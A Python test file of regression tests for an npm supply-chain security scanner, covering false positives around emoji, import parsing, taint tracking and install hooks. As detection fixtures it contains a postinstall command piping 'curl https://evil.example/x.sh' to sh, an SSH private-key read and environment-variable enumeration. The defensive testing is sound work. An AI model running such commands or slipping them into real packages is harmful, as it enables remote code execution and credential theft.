"""Precision regressions from the wave-2 AgentGate corpus (2026-09-09).

Five false-positive classes verified against live clean npm packages
(@antv/mcp-server-antv@0.1.8, mcp-echarts@0.7.1, mcp-mermaid@0.4.1):

  1. VS16 (U+FE0F) after text-presentation emoji bases (U+2139 info, arrows,
     zodiac, etc.) was flagged as Unicode smuggling.
  2. extract_js_imports emitted garbage module names (newlines, punctuation)
     from mid-code 'from' text, surfacing as phantom-dependency titles.
  3. Cross-file taint marked whole modules tainted from ubiquitous patterns
     (bare process.env read, JSON config parse), mass-flagging importers.
  4. `playwright install` postinstall was not a known-safe hook, so the
     lifecycle+network correlation read it as install-time exfiltration.
  5. Rule 5 (Install-Time Exfiltration) accepted known-safe hooks as the
     lifecycle side of the correlation.
"""

import json
import re

import forensics_core as core
import scan_skill_threats as skill
import scan_manifest_drift as drift
import scan_lifecycle as lifecycle
import scan_dataflow as dataflow


def _write(root, rel, content):
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
    return p


class TestEmojiVariationSelector:
    def test_info_emoji_vs16_not_flagged(self):
        assert skill._is_emoji_codepoint(0x2139)  # INFORMATION SOURCE

    def test_common_text_presentation_bases_whitelisted(self):
        for cp in (0x2122, 0x2194, 0x21A9, 0x2648, 0x26A1, 0x25B6, 0x25FE):
            assert skill._is_emoji_codepoint(cp), hex(cp)

    def test_non_emoji_still_rejected(self):
        assert not skill._is_emoji_codepoint(0xE8)     # accented latin
        assert not skill._is_emoji_codepoint(0x4E2D)   # CJK
        assert not skill._is_emoji_codepoint(0x41)     # 'A'

    def test_logger_line_with_emoji_clean(self, tmp_path):
        p = _write(tmp_path, "logger.js",
                   'console.log(`${prefix} \u2139\ufe0f  ${message}`, ...args);\n')
        findings = skill.scan_file(str(p), "logger.js")
        vs = [f for f in findings if "Variation Selector" in f.title]
        assert vs == [], [f.description for f in vs]


class TestJsImportExtraction:
    def test_garbage_module_names_rejected(self, tmp_path):
        p = _write(tmp_path, "schema.ts", (
            'import { z } from "zod";\n'
            'const s = z.object({ intent: z.string().min(1) });\n'
            'const x = require("axios");\n'
        ))
        mods = drift.extract_js_imports(str(p))
        assert mods == {"zod", "axios"}, mods

    def test_multiline_garbage_rejected(self, tmp_path):
        p = _write(tmp_path, "junk.js", 'const a = "from ,\n ),\n intent: z";\n')
        mods = drift.extract_js_imports(str(p))
        assert all(re.match(r"^(?:@[a-z0-9][a-z0-9._~-]*/)?[a-z0-9][a-z0-9._~-]*$", m)
                   for m in mods), mods

    def test_scoped_and_subpath_ok(self, tmp_path):
        p = _write(tmp_path, "ok.js",
                   'require("@scope/pkg/sub");\nimport "undici";\n')
        mods = drift.extract_js_imports(str(p))
        assert "@scope/pkg" in mods and "undici" in mods


class TestCrossFileTaint:
    def test_bare_env_read_does_not_taint_module(self, tmp_path):
        _write(tmp_path, "package.json", json.dumps({"name": "t"}))
        _write(tmp_path, "index.js",
               'const key = process.env.API_KEY;\nmodule.exports = { key };\n')
        _write(tmp_path, "tool.js",
               'const { key } = require("./index");\nfetch("https://api.example.com");\n')
        findings = dataflow.main.__wrapped__ if hasattr(dataflow.main, "__wrapped__") else None
        # run the module-level cross-file logic via build_import_graph + sources
        graph = dataflow.build_import_graph(str(tmp_path), [])
        assert "index" in graph.get("tool.js", set())
        # strong-source filter must exclude bare process.env access
        strong = [p for p in dataflow.JS_SOURCES
                  if p[1] in ("process.env enumeration", "Sensitive file read")]
        content = (tmp_path / "index.js").read_text()
        assert not any(p.search(content) for p, _ in strong)

    def test_env_enumeration_still_taints(self):
        strong = [p for p in dataflow.JS_SOURCES
                  if p[1] in ("process.env enumeration", "Sensitive file read")]
        evil = 'const e = Object.keys(process.env);'
        assert any(p.search(evil) for p, _ in strong)

    def test_sensitive_file_read_still_taints(self):
        strong = [p for p in dataflow.JS_SOURCES
                  if p[1] in ("process.env enumeration", "Sensitive file read")]
        evil = 'const k = fs.readFileSync(`${home}/.ssh/id_rsa`);'
        assert any(p.search(evil) for p, _ in strong)


class TestKnownSafeHooks:
    def test_playwright_install_safe(self):
        assert lifecycle.KNOWN_SAFE_HOOKS.match("playwright install")
        assert lifecycle.KNOWN_SAFE_HOOKS.match("playwright install --with-deps chromium")

    def test_husky_and_build_safe(self):
        assert lifecycle.KNOWN_SAFE_HOOKS.match("husky && npm run build")

    def test_chained_network_not_safe(self):
        assert not lifecycle.KNOWN_SAFE_HOOKS.match(
            "playwright install && curl https://evil.example/x.sh | sh")

    def test_relay_script_not_safe(self):
        assert not lifecycle.KNOWN_SAFE_HOOKS.match("node scripts/check-env.js")


class TestInstallExfilCorrelation:
    def _finding(self, title, desc, category, scanner="lifecycle"):
        return core.Finding(
            scanner=scanner, severity="low", title=title,
            description=desc, file="package.json", line=0,
            snippet="", category=category,
        )

    def test_known_safe_hook_not_install_exfil(self):
        findings = [
            self._finding("NPM Hook: 'postinstall' (Known Safe Pattern)",
                          "Lifecycle hook uses recognized build tooling command",
                          "lifecycle-hook"),
            self._finding("Outbound URL",
                          "network call to https://example.com",
                          "network"),
        ]
        correlated = core.correlate(findings)
        exfil = [f for f in correlated if f.title == "Install-Time Exfiltration"]
        assert exfil == [], [f.description for f in exfil]

    def test_real_hook_with_network_still_flagged(self):
        findings = [
            self._finding("NPM Hook: 'postinstall' Runs External Script",
                          "Lifecycle hook executes external file",
                          "lifecycle-hook"),
            self._finding("Outbound URL",
                          "network call to https://evil.example",
                          "network"),
        ]
        correlated = core.correlate(findings)
        exfil = [f for f in correlated if f.title == "Install-Time Exfiltration"]
        assert exfil, "expected real lifecycle+network correlation to fire"
